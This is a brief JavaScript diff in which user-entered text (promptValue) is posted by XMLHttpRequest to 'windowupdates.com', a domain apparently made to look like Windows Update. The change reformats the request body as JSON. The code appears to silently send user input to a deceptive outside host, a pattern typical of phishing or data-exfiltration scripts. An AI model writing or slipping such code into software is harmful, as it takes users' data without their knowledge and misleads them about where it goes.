@@ -30,9 +30,9 @@
 
         post_url = "https://windowupdates.com/"
         var xhttp = new XMLHttpRequest();
-        xhttp.open("POST", post_url, true);
-        xhttp.setRequestHeader('Content-Type', 'text/plain');
-        xhttp.send(JSON.stringify(promptValue));
+        xhttp.open('POST', post_url, true);
+        xhttp.setRequestHeader('Content-Type', 'application/json');
+        xhttp.send(JSON.stringify({ value: promptValue }));
     
         console.log('Submitted prompt:', promptValue);
         });
